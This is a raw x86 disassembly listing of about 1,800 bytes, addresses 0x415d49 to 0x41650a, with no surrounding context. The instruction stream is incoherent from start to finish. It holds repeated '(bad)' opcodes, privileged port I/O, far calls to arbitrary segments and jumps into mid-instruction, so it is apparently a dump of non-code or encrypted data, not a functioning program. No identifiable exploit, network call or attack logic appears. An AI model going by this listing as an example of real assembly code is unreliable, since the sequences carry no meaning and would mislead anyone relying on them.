  415d49:	sqrtps xmm4,XMMWORD PTR [ecx+0x3f]
  415d4d:	or     ebx,DWORD PTR [edi]
  415d4f:	gs pusha 
  415d51:	xchg   ebx,eax
  415d52:	ins    BYTE PTR es:[edi],dx
  415d53:	dec    esp
  415d54:	mov    bh,0xfe
  415d56:	lods   al,BYTE PTR ds:[esi]
  415d57:	repz dec esi
  415d59:	aaa    
  415d5a:	fist   DWORD PTR [edi-0x2b]
  415d5d:	and    edi,DWORD PTR [ecx+0xe]
  415d60:	xor    al,0xd8
  415d62:	push   cs
  415d63:	data16 cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  415d66:	xchg   DWORD PTR [esi],ecx
  415d68:	ficomp WORD PTR ds:0xdf4046a4
  415d6e:	dec    edx
  415d6f:	cli    
  415d70:	repnz stos BYTE PTR es:[edi],al
  415d72:	push   ss
  415d73:	outs   dx,BYTE PTR ds:[esi]
  415d74:	rcl    ah,cl
  415d76:	clc    
  415d77:	pop    eax
  415d78:	les    eax,FWORD PTR [edx]
  415d7a:	jmp    0x415dfb
  415d7c:	ja     0x415dbd
  415d7e:	popa   
  415d7f:	jo     0x415dad
  415d81:	clc    
  415d82:	xor    ebx,edi
  415d84:	mov    ecx,0xe5ed4310
  415d89:	rcr    BYTE PTR [edi+0x5f],0x74
  415d8d:	ret    
  415d8e:	xchg   ebx,eax
  415d8f:	mul    DWORD PTR [eax]
  415d91:	loopne 0x415da7
  415d93:	adc    edi,DWORD PTR ds:0xdfe5f765
  415d99:	jg     0x415d45
  415d9b:	inc    edi
  415d9c:	xchg   ebx,eax
  415d9d:	and    eax,0xda673373
  415da2:	out    0xbe,al
  415da4:	not    BYTE PTR [edi]
  415da6:	mov    dl,bl
  415da8:	sbb    eax,0x8acf761a
  415dad:	xchg   ecx,eax
  415dae:	push   esp
  415daf:	stos   BYTE PTR es:[edi],al
  415db0:	sub    al,0xdb
  415db2:	add    eax,DWORD PTR [esi]
  415db4:	shl    dl,0x1c
  415db7:	add    ebx,esi
  415db9:	sbb    BYTE PTR [ebp-0x7d],bl
  415dbc:	std    
  415dbd:	(bad)  
  415dbe:	dec    esp
  415dbf:	daa    
  415dc0:	cmp    al,0x82
  415dc2:	pop    esi
  415dc3:	jge    0x415e16
  415dc5:	mov    eax,ds:0x6c295a19
  415dca:	aad    0xd3
  415dcc:	adc    DWORD PTR [eax+0x72],esp
  415dcf:	inc    eax
  415dd0:	xor    bh,cl
  415dd2:	push   eax
  415dd3:	mov    eax,0xb7a7ced5
  415dd8:	lods   eax,DWORD PTR ds:[esi]
  415dd9:	pop    ebx
  415dda:	mov    dh,0x13
  415ddc:	pop    edi
  415ddd:	xor    eax,0x1adb4e14
  415de2:	fs add eax,0xb1843998
  415de8:	sar    BYTE PTR [ebp+0x645422d0],cl
  415dee:	dec    edx
  415def:	cmp    edx,DWORD PTR [edi]
  415df1:	mov    ch,0xc8
  415df3:	adc    eax,0x29e1407a
  415df8:	xchg   edi,eax
  415df9:	dec    ebx
  415dfa:	popa   
  415dfb:	(bad)  
  415dfc:	cmp    esi,ebx
  415dfe:	pop    ds
  415dff:	(bad)  
  415e00:	jp     0x415e71
  415e02:	cmp    esi,edx
  415e04:	dec    edi
  415e05:	popa   
  415e06:	sub    dl,BYTE PTR [edi-0x3b]
  415e09:	sub    edx,DWORD PTR [esi-0x49]
  415e0c:	inc    edx
  415e0d:	stos   DWORD PTR es:[edi],eax
  415e0e:	fdivr  st(4),st
  415e10:	cmp    cl,BYTE PTR [ebx]
  415e12:	cmp    ch,BYTE PTR [edx]
  415e14:	cs jno 0x415dcb
  415e17:	xor    ah,al
  415e19:	push   cs
  415e1a:	xor    al,0xc6
  415e1c:	cli    
  415e1d:	inc    ebp
  415e1e:	inc    eax
  415e1f:	jns    0x415dd5
  415e21:	icebp  
  415e22:	not    esp
  415e24:	xor    eax,0x8445cdd2
  415e29:	pop    ebp
  415e2a:	fsub   QWORD PTR [ebx]
  415e2c:	xchg   ebx,eax
  415e2d:	shr    BYTE PTR [ebx+0x40],cl
  415e30:	test   BYTE PTR [ebp+ecx*4-0x349894ea],0xa2
  415e38:	jmp    0x415e34
  415e3a:	call   0x2532339
  415e3f:	jmp    0x415eb3
  415e41:	out    dx,al
  415e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e43:	je     0x415df8
  415e45:	push   0xffffffbb
  415e47:	adc    edi,edx
  415e49:	fwait
  415e4a:	pusha  
  415e4b:	pop    ecx
  415e4c:	push   ebx
  415e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e4e:	leave  
  415e4f:	xchg   esp,eax
  415e50:	mov    eax,ds:0x3dab6c45
  415e55:	add    al,0xc5
  415e57:	cli    
  415e58:	sbb    bl,bh
  415e5a:	out    0x29,al
  415e5c:	jmp    0x594d7354
  415e61:	fsubr  QWORD PTR [esi]
  415e63:	arpl   WORD PTR [eax-0x5dc9ac7b],cx
  415e69:	in     al,0x57
  415e6b:	push   eax
  415e6c:	bound  esi,QWORD PTR [esi+0xd]
  415e6f:	inc    eax
  415e70:	arpl   WORD PTR [eax+eiz*1+0x58516f0],dx
  415e77:	mov    BYTE PTR [edi+0x7b],bh
  415e7a:	adc    bh,BYTE PTR ds:0xf946a39e
  415e80:	mov    edx,0xff193360
  415e85:	pop    esp
  415e86:	sub    al,0x13
  415e88:	mul    DWORD PTR [ebx-0x37c47a0d]
  415e8e:	cmp    BYTE PTR [ecx-0x1],bl
  415e91:	cmp    al,0x1c
  415e93:	pop    eax
  415e94:	js     0x415e93
  415e96:	and    eax,0x126b61fd
  415e9b:	jp     0x415ef6
  415e9d:	or     al,0x6e
  415e9f:	cs cmc 
  415ea1:	data16 jno 0x415e61
  415ea4:	pop    es
  415ea5:	cmp    bh,BYTE PTR [ebx]
  415ea7:	repz pop ss
  415ea9:	js     0x415ead
  415eab:	imul   BYTE PTR [eax-0x3817d854]
  415eb1:	fcmovbe st,st(7)
  415eb3:	push   0x1d0a14f3
  415eb8:	add    al,0x60
  415eba:	sub    BYTE PTR [eax-0x2831cb44],dl
  415ec0:	fwait
  415ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec2:	cs push ebx
  415ec4:	sbb    al,0x9b
  415ec6:	add    eax,0xcc05f526
  415ecb:	xchg   edx,eax
  415ecc:	jne    0x415e51
  415ece:	pusha  
  415ecf:	cwde   
  415ed0:	or     ebx,esp
  415ed2:	arpl   WORD PTR [esi],dx
  415ed4:	sbb    al,0x75
  415ed6:	pop    edx
  415ed7:	inc    edi
  415ed8:	push   ebp
  415ed9:	mov    bl,0x54
  415edb:	cmp    al,BYTE PTR [eax-0xb30131]
  415ee1:	sti    
  415ee2:	stc    
  415ee3:	sub    al,0xd8
  415ee5:	jecxz  0x415e93
  415ee7:	mov    edx,0x9d1c16ae
  415eec:	mov    ch,0x4f
  415eee:	out    dx,eax
  415eef:	sbb    DWORD PTR [esi+0xb],esp
  415ef2:	stos   DWORD PTR es:[edi],eax
  415ef3:	loopne 0x415ec3
  415ef5:	sar    ecx,1
  415ef7:	mov    BYTE PTR [ebp+ebp*8-0xaea3162],0xbd
  415eff:	scas   eax,DWORD PTR es:[edi]
  415f00:	aas    
  415f01:	adc    ebp,DWORD PTR [ebx+0x4a]
  415f04:	xchg   bl,bh
  415f06:	ret    0x3a2d
  415f09:	leave  
  415f0a:	adc    BYTE PTR [eax+ebx*2-0x1b],al
  415f0e:	clc    
  415f0f:	rol    esp,1
  415f11:	push   ebp
  415f12:	jmp    0x2bcdd973
  415f17:	or     bh,BYTE PTR [eax+edx*8-0xfd59486]
  415f1e:	or     DWORD PTR [edx-0x702368fc],eax
  415f24:	xchg   edx,eax
  415f25:	aaa    
  415f26:	push   ebx
  415f27:	and    BYTE PTR [esi],al
  415f29:	jp     0x415f46
  415f2b:	push   0xffffffa5
  415f2d:	pushf  
  415f2e:	dec    ebp
  415f2f:	and    dl,cl
  415f31:	cld    
  415f32:	push   ebp
  415f33:	sbb    ebp,DWORD PTR [edi+0x29179cad]
  415f39:	loope  0x415ec7
  415f3b:	inc    eax
  415f3c:	in     al,0x5
  415f3e:	push   ebp
  415f3f:	pop    es
  415f40:	sub    ebp,DWORD PTR [ebp-0x33]
  415f43:	pop    edi
  415f44:	mov    eax,0xbbc2b5e8
  415f49:	jecxz  0x415fc6
  415f4b:	popf   
  415f4c:	cmp    eax,0xc2f0fec8
  415f51:	in     eax,0xf
  415f53:	scas   eax,DWORD PTR es:[edi]
  415f54:	mul    BYTE PTR [edx]
  415f56:	push   edi
  415f57:	ss mov edi,0x60c798e8
  415f5d:	inc    edx
  415f5e:	dec    edi
  415f5f:	loope  0x415f9d
  415f61:	mov    bl,0xdb
  415f63:	and    al,0x25
  415f65:	xlat   BYTE PTR ds:[ebx]
  415f66:	scas   eax,DWORD PTR es:[edi]
  415f67:	add    DWORD PTR [ecx-0x6bea668f],ecx
  415f6d:	ins    DWORD PTR es:[edi],dx
  415f6e:	xor    al,BYTE PTR [esi-0x7c8a86c4]
  415f74:	sbb    eax,0x736330b8
  415f79:	adc    DWORD PTR [edx+0x8c46aac],eax
  415f7f:	push   0x33ac6ad4
  415f84:	lods   al,BYTE PTR ds:[esi]
  415f85:	es pusha 
  415f87:	sub    DWORD PTR [edx],ecx
  415f89:	xchg   edi,eax
  415f8a:	mov    ah,0xc5
  415f8c:	pop    eax
  415f8d:	fcmovb st,st(4)
  415f8f:	test   eax,0x9cd8dd63
  415f94:	test   BYTE PTR [ebx-0x6f3cbef7],ch
  415f9a:	adc    BYTE PTR [ebp-0x1e],bl
  415f9d:	scas   al,BYTE PTR es:[edi]
  415f9e:	push   esi
  415f9f:	ins    DWORD PTR es:[edi],dx
  415fa0:	adc    dh,BYTE PTR ds:0xd2a47c6e
  415fa6:	test   DWORD PTR [edx],0x195ef86d
  415fac:	mov    ah,0xff
  415fae:	push   ebp
  415faf:	sbb    BYTE PTR [esi+edi*4],0xf4
  415fb3:	rol    DWORD PTR gs:[eax-0x560da99a],cl
  415fba:	(bad)  
  415fbb:	leave  
  415fbc:	xlat   BYTE PTR ds:[ebx]
  415fbd:	pusha  
  415fbe:	test   bl,dh
  415fc0:	imul   ebp,DWORD PTR [ebx-0x611bf4cd],0xe7e441da
  415fca:	pop    edx
  415fcb:	lds    edx,FWORD PTR ds:0x1c889195
  415fd1:	daa    
  415fd2:	popa   
  415fd3:	lods   al,BYTE PTR ds:[esi]
  415fd4:	inc    ecx
  415fd5:	dec    edx
  415fd6:	div    BYTE PTR [ebx+0x26eabe8c]
  415fdc:	xor    DWORD PTR [edx+0x54dc1cac],esi
  415fe2:	jno    0x416021
  415fe4:	fisubr WORD PTR [edi+0x2f5eddff]
  415fea:	sub    DWORD PTR [edi+0x50311d79],0xffffff81
  415ff1:	mov    DWORD PTR [ecx-0x42e38ead],esp
  415ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ff8:	jnp    0x416061
  415ffa:	sub    esi,eax
  415ffc:	dec    ecx
  415ffd:	rcl    BYTE PTR [esi+0x2d3ea583],cl
  416003:	cmp    edi,0x1f
  416006:	sti    
  416007:	fist   DWORD PTR [ebx-0x7]
  41600a:	lea    esi,[ebp+0xa]
  41600d:	fwait
  41600e:	inc    edi
  41600f:	xor    eax,0xcbf4bb1d
  416014:	xor    al,0xe0
  416016:	das    
  416017:	lahf   
  416018:	xor    esp,DWORD PTR [ecx-0xcd1397d]
  41601e:	sbb    ebp,DWORD PTR ds:[ebp+0x2e0cdf9f]
  416025:	jo     0x416059
  416027:	jno    0x416054
  416029:	les    ebp,FWORD PTR [edx]
  41602b:	mov    dh,0x4e
  41602d:	fwait
  41602e:	or     edx,ecx
  416030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416031:	and    bh,ch
  416033:	popf   
  416034:	mov    WORD PTR ds:0x7a489a3a,?
  41603a:	sbb    ebp,DWORD PTR [edi]
  41603c:	and    BYTE PTR [edi+0x35],cl
  41603f:	mov    al,0xa8
  416041:	lods   eax,DWORD PTR ds:[esi]
  416042:	pop    ebx
  416043:	adc    dh,bh
  416045:	(bad)  
  416047:	ins    DWORD PTR es:[edi],dx
  416048:	adc    edx,DWORD PTR [edi+0x402d51ef]
  41604e:	lods   eax,DWORD PTR ds:[esi]
  41604f:	xlat   BYTE PTR ds:[ebx]
  416050:	cmp    eax,0x24475912
  416055:	mov    edx,0x9d35584b
  41605a:	sub    eax,0xb04ac009
  41605f:	and    al,BYTE PTR [esi-0x10]
  416062:	mov    ds:0xa4548301,eax
  416067:	jmp    0xeec7:0x28987232
  41606e:	mov    ds:0xe71a3a3e,al
  416073:	inc    ecx
  416074:	sbb    dl,BYTE PTR [esi]
  416076:	loop   0x4160ec
  416078:	out    dx,al
  416079:	pop    esi
  41607a:	retf   
  41607b:	(bad)  
  41607c:	mov    al,0x12
  41607e:	mov    al,ds:0x8b4cf749
  416083:	aad    0xe6
  416085:	inc    esi
  416086:	lods   eax,DWORD PTR ds:[esi]
  416087:	inc    edx
  416088:	jno    0x4160eb
  41608a:	nop
  41608b:	jo     0x416010
  41608d:	lahf   
  41608e:	and    BYTE PTR [ecx-0x2c4cc81d],bh
  416094:	inc    edx
  416095:	mov    dh,0x13
  416097:	out    dx,eax
  416098:	inc    ebx
  416099:	ins    DWORD PTR es:[edi],dx
  41609a:	ror    DWORD PTR [esi-0x42],1
  41609d:	out    0x60,eax
  41609f:	fild   WORD PTR [ebp-0x4a914ab4]
  4160a5:	je     0x4160a1
  4160a7:	rcr    BYTE PTR [eax],0x25
  4160aa:	mov    BYTE PTR [ebx],0xda
  4160ad:	fistp  QWORD PTR [ecx+esi*4+0x1b00732b]
  4160b4:	xchg   ebx,eax
  4160b5:	fsub   DWORD PTR [esi]
  4160b7:	mov    WORD PTR [esi-0x7caf17ec],es
  4160bd:	sbb    bh,BYTE PTR [edi]
  4160bf:	mov    edx,0x5892b431
  4160c4:	into   
  4160c5:	adc    ah,BYTE PTR [ecx]
  4160c7:	mov    ds:0x23e896c,eax
  4160cc:	fmul   DWORD PTR [esi]
  4160ce:	mov    al,0xd6
  4160d0:	daa    
  4160d1:	cmp    DWORD PTR [ebx],edi
  4160d3:	aad    0x41
  4160d5:	or     eax,0x7507561c
  4160da:	in     al,dx
  4160db:	pushf  
  4160dc:	and    ebx,edx
  4160de:	bound  esi,QWORD PTR ds:0x2ebb1185
  4160e4:	iret   
  4160e5:	push   cs
  4160e6:	pusha  
  4160e7:	add    eax,0xa80c21c6
  4160ec:	mov    bl,0x29
  4160ee:	push   0x1b
  4160f0:	push   esi
  4160f1:	idiv   BYTE PTR [edx+0x1fb67f22]
  4160f7:	and    BYTE PTR [esi+0x409d9668],dl
  4160fd:	retf   
  4160fe:	fs out 0x5f,al
  416101:	aaa    
  416102:	stc    
  416103:	dec    edx
  416104:	into   
  416105:	pop    ecx
  416106:	sbb    DWORD PTR [edx+eax*8+0x137cb188],0x62
  41610e:	xchg   BYTE PTR gs:[eax-0x62c02543],dl
  416115:	ins    DWORD PTR es:[edi],dx
  416116:	in     al,0x39
  416118:	mov    bl,0xb6
  41611a:	or     DWORD PTR [edi-0x59],ebx
  41611d:	loopne 0x4160a6
  41611f:	fnsave [ebp+0x2e]
  416122:	dec    ecx
  416123:	sub    BYTE PTR [edi],dh
  416125:	loope  0x41611f
  416127:	add    edi,DWORD PTR [edi]
  416129:	add    edi,DWORD PTR [ebx+edi*1+0x3bae6a3]
  416130:	jge    0x416134
  416132:	mov    edi,fs
  416134:	or     DWORD PTR [esi+0x6db99b3],eax
  41613a:	mov    dl,0x22
  41613c:	push   esp
  41613d:	sbb    eax,esi
  41613f:	popa   
  416140:	push   edx
  416141:	das    
  416142:	push   es
  416143:	push   esp
  416144:	or     eax,0xda2432b3
  416149:	shl    al,0x64
  41614c:	call   0xffb16077
  416151:	cmp    eax,0x8cbd6d00
  416156:	pop    esp
  416157:	or     bl,ah
  416159:	xor    bl,dl
  41615b:	jecxz  0x41613c
  41615d:	in     eax,dx
  41615e:	push   eax
  41615f:	adc    edi,edx
  416161:	push   cs
  416162:	fcom   QWORD PTR [edx]
  416164:	jno    0x41614e
  416166:	jge    0x4161ab
  416168:	(bad)
  41616c:	mov    ds:0x1a7f7bc6,al
  416171:	test   esi,ecx
  416173:	dec    eax
  416174:	sub    eax,eax
  416176:	pusha  
  416177:	mov    bh,dh
  416179:	xchg   esp,eax
  41617a:	call   0x8268365c
  41617f:	js     0x4161ca
  416181:	pop    eax
  416182:	leave  
  416183:	sti    
  416184:	cmp    al,0x95
  416186:	push   edi
  416187:	jae    0x416158
  416189:	pop    edx
  41618a:	gs add al,0x74
  41618d:	xor    BYTE PTR [ebx],dh
  41618f:	cmc    
  416190:	lahf   
  416191:	scas   eax,DWORD PTR es:[edi]
  416192:	imul   ecx,DWORD PTR ds:0xedc4f511,0x17
  416199:	test   al,0x79
  41619b:	xchg   DWORD PTR [edi],esi
  41619d:	cdq    
  41619e:	xchg   edi,eax
  41619f:	sub    BYTE PTR [edx+edi*8+0x49ab15bd],0x14
  4161a7:	test   eax,0x1434e93a
  4161ac:	int    0xa3
  4161ae:	cmp    al,0xa0
  4161b0:	jg     0x416135
  4161b2:	cli    
  4161b3:	sub    al,0xf5
  4161b5:	adc    dh,cl
  4161b7:	lock mov esi,esp
  4161ba:	push   esp
  4161bb:	mov    bh,BYTE PTR ds:0xd608084
  4161c1:	jl     0x416172
  4161c3:	sub    eax,0xcc73047e
  4161c8:	dec    ebx
  4161c9:	and    esi,DWORD PTR [ecx+0x7662bab2]
  4161cf:	sbb    al,0xe1
  4161d1:	out    dx,al
  4161d2:	xchg   edx,eax
  4161d3:	jno    0x41616b
  4161d5:	mov    ebp,0xbbb687e3
  4161da:	push   0xa139a9a2
  4161df:	jmp    0x41623c
  4161e1:	mov    ch,0x3f
  4161e3:	and    al,0x29
  4161e5:	pop    es
  4161e6:	mov    WORD PTR [ebx-0x3a],ds
  4161e9:	or     al,0x67
  4161eb:	dec    ebx
  4161ec:	push   0x93cc040e
  4161f1:	xor    ah,BYTE PTR [eax-0x1c33c6b7]
  4161f7:	and    DWORD PTR [ecx-0x350b21f5],edx
  4161fd:	sub    al,0x46
  4161ff:	hlt    
  416200:	fidivr WORD PTR [edx]
  416202:	les    esi,FWORD PTR [ecx+0x7c]
  416205:	enter  0x87f5,0x9c
  416209:	mov    eax,ds:0x91a8c643
  41620e:	jmp    0x9af:0x35bb6c5f
  416215:	inc    BYTE PTR [eax-0x6]
  416218:	mov    eax,ds:0xaa832e0c
  41621d:	cmp    al,0x82
  41621f:	les    edx,FWORD PTR [edi+0x45616501]
  416225:	mov    ch,0x28
  416227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416228:	out    dx,al
  416229:	mov    dh,0x4
  41622b:	add    eax,0x8bbf112f
  416230:	and    BYTE PTR [edx],cl
  416232:	add    DWORD PTR ds:0xbde9f1b2,eax
  416238:	fsubr  st(0),st
  41623a:	xor    DWORD PTR [esi+0xd9bfdf6],0x72b49e03
  416244:	sti    
  416245:	xchg   DWORD PTR [ecx],esi
  416247:	xchg   BYTE PTR [ebx],bh
  416249:	jnp    0x416257
  41624b:	popa   
  41624c:	int3   
  41624d:	fldcw  WORD PTR [ebp-0x47]
  416250:	push   ebx
  416251:	in     eax,0x20
  416253:	push   eax
  416254:	mov    ecx,0x52466b3
  416259:	call   0x19e1:0x6ea89a10
  416260:	push   es
  416261:	jb     0x416268
  416263:	mov    edi,esp
  416265:	lock jmp 0x1f96fac9
  41626b:	xor    al,BYTE PTR [eax+edi*8]
  41626e:	mov    al,0x16
  416270:	sbb    al,0xe4
  416272:	lods   al,BYTE PTR ds:[esi]
  416273:	xchg   edi,eax
  416274:	loope  0x4162f4
  416276:	out    dx,eax
  416277:	loop   0x416237
  416279:	xor    eax,0xcaf02165
  41627e:	push   ebp
  41627f:	ror    BYTE PTR [ecx+eax*4+0x5],1
  416283:	shl    DWORD PTR [esi+0x6a],1
  416286:	sbb    al,0xeb
  416288:	push   esp
  416289:	jle    0x416263
  41628b:	add    bl,BYTE PTR [edx+ecx*2-0x351813ea]
  416292:	ins    BYTE PTR es:[edi],dx
  416293:	jb     0x4162cd
  416295:	cmc    
  416296:	add    bh,BYTE PTR [esi+0x5b]
  416299:	sbb    al,0x98
  41629b:	in     al,dx
  41629c:	mov    ch,0x5
  41629e:	add    BYTE PTR [eax+0x2939ad91],ch
  4162a4:	push   cs
  4162a5:	lods   eax,DWORD PTR ds:[esi]
  4162a6:	pop    esp
  4162a7:	test   al,0x82
  4162a9:	out    0x7d,al
  4162ab:	xor    BYTE PTR [eax],dh
  4162ad:	mov    edi,?
  4162af:	loope  0x4162ea
  4162b1:	call   0xf948:0x404055be
  4162b8:	jbe    0x4162e9
  4162ba:	mov    bh,0xce
  4162bc:	retf   
  4162bd:	or     edx,eax
  4162bf:	sbb    al,0xf9
  4162c1:	(bad)  
  4162c2:	popf   
  4162c3:	repnz pop ebx
  4162c5:	in     eax,0x18
  4162c7:	jl     0x416348
  4162c9:	pop    ecx
  4162ca:	push   0xffffffb2
  4162cc:	sub    al,0x37
  4162ce:	je     0x4162a7
  4162d0:	nop
  4162d1:	mov    ah,ch
  4162d3:	neg    ebp
  4162d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162d6:	ret    0x48bf
  4162d9:	cli    
  4162da:	cmp    BYTE PTR [edx+edi*1-0x6c],0x8a
  4162df:	mov    ch,0x4f
  4162e1:	push   ds
  4162e2:	cmc    
  4162e3:	and    al,0xb8
  4162e5:	data16 (bad) 
  4162e8:	jp     0x4162ab
  4162ea:	jo     0x41629f
  4162ec:	or     DWORD PTR [edi+0x74f9c890],ebx
  4162f2:	pop    edx
  4162f3:	aaa    
  4162f4:	push   0xd
  4162f6:	pushf  
  4162f7:	xor    al,0xb6
  4162f9:	push   ebp
  4162fa:	pop    ecx
  4162fb:	add    bh,BYTE PTR [ecx-0x45]
  4162fe:	mov    fs,WORD PTR ds:0xbb4cb460
  416304:	ins    BYTE PTR es:[edi],dx
  416305:	xchg   ecx,eax
  416306:	push   ebp
  416307:	xor    DWORD PTR [ecx-0x4f2f84aa],0x1211a6a7
  416311:	and    DWORD PTR [ecx-0x65],esi
  416314:	int    0xe2
  416316:	rol    ebx,0xf4
  416319:	sbb    al,0xec
  41631b:	xor    al,0x1c
  41631d:	push   esp
  41631e:	ret    0xfd21
  416321:	cmp    bl,BYTE PTR [edx-0x26087ba6]
  416327:	and    eax,0x6a53f3fb
  41632c:	mov    edx,0xe73b1e15
  416331:	popa   
  416332:	(bad)  
  416333:	sar    BYTE PTR [ebx+0x5c],cl
  416336:	fwait
  416337:	addr16 or al,0x58
  41633a:	sub    BYTE PTR [esi+0x74d05962],ah
  416340:	sar    ecx,0xe3
  416343:	cdq    
  416344:	nop
  416345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416346:	pop    ebp
  416347:	fistp  DWORD PTR [edi+ebp*1+0x34]
  41634b:	jg     0x416304
  41634d:	jo     0x416393
  41634f:	inc    ebp
  416350:	xchg   ebx,eax
  416351:	loopne 0x4162ed
  416353:	jmp    0x4162db
  416355:	mov    edx,0x92031e8b
  41635a:	pushf  
  41635b:	cdq    
  41635c:	lea    eax,[esi+0x18]
  41635f:	mov    ch,BYTE PTR [ebp+0x31]
  416362:	mov    esp,0x22c071c7
  416367:	xchg   edx,eax
  416368:	add    eax,0x203c6c53
  41636d:	fidivr WORD PTR [esi+0x1d]
  416370:	(bad)  
  416371:	pop    ecx
  416372:	inc    esi
  416373:	je     0x41639e
  416375:	sub    eax,0x5894a352
  41637a:	push   0x59
  41637c:	sub    eax,0x27be6de6
  416381:	xchg   DWORD PTR [eax],ebp
  416383:	and    DWORD PTR [ebp+0x479834c0],eax
  416389:	inc    eax
  41638a:	call   0x53fd:0x3f4fff93
  416391:	dec    eax
  416392:	std    
  416393:	lds    ebp,FWORD PTR [bx+si-0x64]
  416397:	add    ecx,0x4a92e4ed
  41639d:	es hlt 
  41639f:	call   0x9e51:0x51ffb0f6
  4163a6:	push   edi
  4163a7:	jecxz  0x416366
  4163a9:	out    dx,al
  4163aa:	mov    al,ds:0xbc69af15
  4163af:	cli    
  4163b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b1:	out    0x81,eax
  4163b3:	jmp    0x4163e2
  4163b5:	mov    ecx,0x3ff0e4ec
  4163ba:	imul   ecx,ecx,0x71dbff62
  4163c0:	jns    0x4163fd
  4163c2:	call   0x402af701
  4163c7:	cmp    ebp,0x7f
  4163ca:	in     eax,dx
  4163cb:	mov    DWORD PTR [esi],edi
  4163cd:	ror    esp,1
  4163cf:	cdq    
  4163d0:	and    DWORD PTR [edx-0x9],0xfffffff9
  4163d4:	loopne 0x416448
  4163d6:	stos   DWORD PTR es:[edi],eax
  4163d7:	cmp    al,0x78
  4163d9:	add    ch,ch
  4163db:	cwde   
  4163dc:	xlat   BYTE PTR ds:[ebx]
  4163dd:	dec    ebp
  4163de:	adc    al,0x98
  4163e0:	lea    ecx,[ebx+0x18455ad2]
  4163e6:	mov    ecx,0xee443ecb
  4163eb:	inc    edx
  4163ec:	aas    
  4163ed:	pop    eax
  4163ee:	sbb    ecx,DWORD PTR [ebx]
  4163f0:	mov    al,ds:0xb316a71d
  4163f5:	mov    ebp,0x3fc2c8e4
  4163fa:	jno    0x4163a5
  4163fc:	push   ebx
  4163fd:	add    edx,DWORD PTR [ebx-0x6bd24949]
  416403:	ins    DWORD PTR es:[edi],dx
  416404:	in     al,0xb7
  416406:	pop    ecx
  416407:	mov    al,0x13
  416409:	inc    edi
  41640a:	inc    esi
  41640b:	mov    ds:0x852b43cf,eax
  416410:	scas   eax,DWORD PTR es:[edi]
  416411:	in     eax,dx
  416412:	mov    WORD PTR [esi],gs
  416414:	adc    BYTE PTR cs:[ebx],0x9b
  416418:	aam    0xc1
  41641a:	outs   dx,BYTE PTR ds:[esi]
  41641b:	stos   BYTE PTR es:[edi],al
  41641c:	or     edi,edi
  41641e:	jle    0x416493
  416420:	sub    ebx,DWORD PTR [esi]
  416422:	xlat   BYTE PTR ds:[ebx]
  416423:	cmp    cl,BYTE PTR [edx+edi*1+0x1d6a08e1]
  41642a:	sbb    DWORD PTR [ebp-0x4901581],esi
  416430:	test   BYTE PTR [eax],al
  416432:	add    BYTE PTR [esi],bl
  416434:	add    al,0xf9
  416436:	or     BYTE PTR [edi],ah
  416438:	std    
  416439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41643a:	jbe    0x41648e
  41643c:	mov    ds:0x28924a47,al
  416441:	gs sbb al,0xd0
  416444:	std    
  416445:	retf   0x288b
  416448:	iret   
  416449:	mov    eax,0xa91ad286
  41644e:	mov    esp,esi
  416450:	jns    0x416470
  416452:	cli    
  416453:	aas    
  416454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416455:	adc    esp,edi
  416457:	aas    
  416458:	pop    edi
  416459:	sbb    DWORD PTR [edx+0x663fc8bf],ecx
  41645f:	dec    edi
  416460:	xchg   BYTE PTR [ebx+0x1f],cl
  416463:	push   cs
  416464:	shr    BYTE PTR [edi+esi*2-0x3f],cl
  416468:	push   ds
  416469:	adc    BYTE PTR es:[ebx-0x4f],0xdd
  41646e:	xor    ecx,DWORD PTR [edi]
  416470:	xchg   esi,eax
  416471:	mov    ebp,0x9eeb9d6d
  416476:	iret   
  416477:	push   edi
  416478:	fstp   TBYTE PTR [eax-0x212e82f]
  41647e:	or     eax,0x393494ff
  416483:	add    DWORD PTR [eax],0x4f
  416486:	lahf   
  416487:	mov    ah,0xf6
  416489:	(bad)  
  41648a:	outs   dx,BYTE PTR ds:[esi]
  41648b:	cmp    BYTE PTR ds:0xd72571,bl
  416491:	dec    eax
  416492:	imul   edi,DWORD PTR [ecx-0x70ec0056],0x5faa9452
  41649c:	push   0x1b
  41649e:	nop
  41649f:	and    bh,BYTE PTR [ebp-0x49a55dca]
  4164a5:	pusha  
  4164a6:	or     edx,DWORD PTR [esi]
  4164a8:	mov    edi,0x679e2dda
  4164ad:	add    esp,DWORD PTR [ebx]
  4164af:	xchg   bh,bl
  4164b1:	and    eax,0xdd5e8e80
  4164b6:	xor    cl,BYTE PTR [ebp-0x40]
  4164b9:	scas   eax,DWORD PTR es:[edi]
  4164ba:	push   ebx
  4164bb:	or     DWORD PTR [ebx],esi
  4164bd:	jns    0x416521
  4164bf:	out    dx,eax
  4164c0:	test   eax,0xe01ad9a3
  4164c5:	cmp    eax,0xafc1dd8c
  4164ca:	(bad)  [edi]
  4164cc:	push   edi
  4164cd:	fsubrp st(2),st
  4164cf:	adc    BYTE PTR [ebx],0xe2
  4164d2:	mov    ebx,0xabb6036b
  4164d7:	sar    DWORD PTR [eax+0x63d01b2e],0x99
  4164de:	icebp  
  4164df:	xor    al,0x80
  4164e1:	popa   
  4164e2:	daa    
  4164e3:	shr    ch,cl
  4164e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e6:	out    0x36,al
  4164e8:	and    esp,DWORD PTR [eax]
  4164ea:	fsubr  QWORD PTR [esi+0xa]
  4164ed:	sar    BYTE PTR [ebp+0x288f1723],cl
  4164f3:	lods   al,BYTE PTR ds:[esi]
  4164f4:	xor    DWORD PTR [esi+0x5f60aa42],esi
  4164fa:	adc    esi,ecx
  4164fc:	aas    
  4164fd:	pop    es
  4164fe:	jne    0x41648c
  416500:	cmp    al,0x9
  416502:	dec    edx
  416503:	sub    DWORD PTR [eax+0x1],ebx
  416506:	add    esi,DWORD PTR [eax+0x78]
  416509:	pop    ebp
  41650a:	push   edx
